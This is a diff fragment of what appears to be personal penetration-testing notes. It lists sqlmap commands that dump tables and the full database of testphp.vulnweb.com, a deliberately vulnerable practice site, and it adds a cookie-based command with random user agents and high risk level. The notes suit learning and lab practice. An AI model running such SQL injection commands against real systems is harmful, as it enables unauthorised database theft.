@@ -14,4 +14,9 @@ Dump table = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acua
 
 Dump the DB = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch
 
+
+
 Reference = https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/
+
+Using cookies
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch
